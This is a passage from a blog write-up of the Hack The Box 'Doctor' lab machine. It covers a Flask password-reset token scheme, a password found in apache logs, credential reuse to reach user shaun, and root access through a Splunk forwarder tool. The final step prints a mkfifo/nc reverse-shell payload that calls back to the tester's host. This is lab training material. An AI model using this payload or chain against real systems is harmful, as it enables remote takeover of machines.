+<span class="n">de</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+        <span class="n">user</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">hashed_password</span>
+        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Your password has been updated! You are now able to log in&#39;</span><span class="p">,</span> <span class="s1">&#39;suc</span>
+<span class="n">cess</span><span class="s1">&#39;)</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;users.login&#39;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;reset_token.html&#39;</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="s1">&#39;Reset Password&#39;</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span>
+<span class="p">)</span>
+</code></pre></div><p>This function first validates the provided token. If the token is valid, then we can overwrite the current password of the user with a new password. Let&rsquo;s check how a token is checked for validity.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">class</span> <span class="nc">User</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">,</span> <span class="n">UserMixin</span><span class="p">):</span>
+    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">email</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">120</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">image_file</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;default.gif&#39;</span><span class="p">)</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">posts</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">relationship</span><span class="p">(</span><span class="s1">&#39;Post&#39;</span><span class="p">,</span> <span class="n">backref</span><span class="o">=</span><span class="s1">&#39;author&#39;</span><span class="p">,</span> <span class="n">lazy</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">get_reset_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">expires_sec</span><span class="o">=</span><span class="mi">1800</span><span class="p">):</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">Serializer</span><span class="p">(</span><span class="n">current_app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">],</span> <span class="n">expires_sec</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">id</span><span class="p">})</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span> <span class="nf">verify_reset_token</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">Serializer</span><span class="p">(</span><span class="n">current_app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">])</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">user_id</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">token</span><span class="p">)[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">None</span>
+        <span class="k">return</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="fm">__repr__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">f</span><span class="s2">&#34;User(&#39;{self.username}&#39;, &#39;{self.email}&#39;, &#39;{self.image_file}&#39;)&#34;</span>
+</code></pre></div><p>A reset token gets generated in the <code>get_reset_token</code> function. We also know the secret key (1234). So we could theoretically generate such a reset token for the admin user and then request a new password for him.</p>
+<p>TBH, I did not try it as I came up with another idea during some thoughtless browsing through the server directories. The Doctor Box Icon contains a &ldquo;Injection Needle&rdquo;, which could stand for the &ldquo;SSTI&rdquo; that we have done previously. But what about that wood piece on the tshirt? Does it refer to &ldquo;Log&rdquo;? That&rsquo;s what I wanted to check even more than doing the token thingy. And indeed! We have access to the apache2 logs. More specifically, there is a logfile called <code>backups</code>. It contains tons of server requests but one is really interesting.</p>
+<pre><code>10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar12
+3&quot; 500 453 &quot;http://doctor.htb/reset_password&quot;
+</code></pre><p>Somebody requested a password reset with an email parameter set to <code>Guitar123</code>. That&rsquo;s weird. Especially because the route does not even exist. So what could it be? For someone who regularly presses TAB for switching login fields, this might look familiar. What if the user actually wanted to enter the password but pressed TAB too often and landed in the URL where he/she then typed the password and pressed ENTER? I wanted to try if that&rsquo;s the password for a user on the machine. I went into the <code>/home</code> directory and checked for existing users. <code>Shaun</code> is the only one besides our current user <code>web</code>. I typed</p>
+<pre><code>su shaun
+Password: Guitar123
+</code></pre><p>Amazing! It works! We now have access to user <code>shaun</code></p>
+<pre><code>shaun@doctor:/var/log/apache2$ hostname &amp;&amp; whoami &amp;&amp; id
+doctor
+shaun
+uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Final step is to obtain a root shell. After another round of going through all the common privilege escalation techniques, I was again pretty stuck, until I took a look at the <code>/etc/passwd</code> file.</p>
+<pre><code>shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
+splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
+</code></pre><p>Of course! We still have the open Splunk Service on the original IP address. And now that we have a user shell we can also use a tool that&rsquo;s known for Splunk Privilege Escalation (<a href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)">https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)</a>. Problem is that the authorization fails with default credentials&hellip; But after some tries, I quickly figured them out: they are the same credentials as our current user <code>shaun:Guitar123</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/wiretups/doctor-machine/pics/splunk_loggedin.png"
+        data-srcset="/wiretups/doctor-machine/pics/splunk_loggedin.png, /wiretups/doctor-machine/pics/splunk_loggedin.png 1.5x, /wiretups/doctor-machine/pics/splunk_loggedin.png 2x"
+        data-sizes="auto"
+        alt="/wiretups/doctor-machine/pics/splunk_loggedin.png"
+        title="/wiretups/doctor-machine/pics/splunk_loggedin.png" width="681" height="737" /></p>
+<p>Now we can use the tool to create an App for us (with user specified payload). But don&rsquo;t forget to set up your nc listener!</p>
+<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">username</span><span class="o">=</span><span class="s2">&#34;shaun&#34;</span> <span class="o">--</span><span class="n">password</span><span class="o">=</span><span class="s2">&#34;Guitar123&#34;</span> <span class="o">--</span><span class="n">payload</span><span class="o">=</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.26 5555 &gt;/tmp/f&#39;</span> <span class="o">--</span><span class="n">payload</span><span class="o">-</span><span class="n">file</span><span class="o">=</span><span class="s1">&#39;pwn.sh&#39;</span>
+</code></pre></div><p>(Exploit.py is the PySplunkWhisperer2_local.py, but I renamed it for convenience.)</p>
+<p>And we obtain a root shell! We pwned the machine.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/wiretups/doctor-machine/pics/root_shell.png"
+        data-srcset="/wiretups/doctor-machine/pics/root_shell.png, /wiretups/doctor-machine/pics/root_shell.png 1.5x, /wiretups/doctor-machine/pics/root_shell.png 2x"
+        data-sizes="auto"
+        alt="/wiretups/doctor-machine/pics/root_shell.png"
+        title="/wiretups/doctor-machine/pics/root_shell.png" width="730" height="204" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-01-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://mondirkb.github.io/wiretups/doctor-machine/" data-title="Doctor machine" data-via="mondir_kb" data-hashtags="Hackthebox"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://mondirkb.github.io/wiretups/doctor-machine/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://mondirkb.github.io/wiretups/doctor-machine/" data-title="Doctor machine"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://mondirkb.github.io/wiretups/doctor-machine/" data-title="Doctor machine"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.0.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://mondirkb.github.io/wiretups/doctor-machine/" data-title="Doctor machine"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/wiretups/alfred-machine/" class="next" rel="next" title="Alfred">Alfred<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.68.3">Hugo</a> | Theme - <a href="#" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> .</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">KEBIR MOUNDIR CHEMSEDDINE</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"/home","id-2":"/home"},"lightgallery":true,"search":{"algoliaAppID":"9TWZEFW5GA","algoliaIndex":"index.en","algoliaSearchKey":"03e766df0fa23122fe9b56e435ed6b84","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
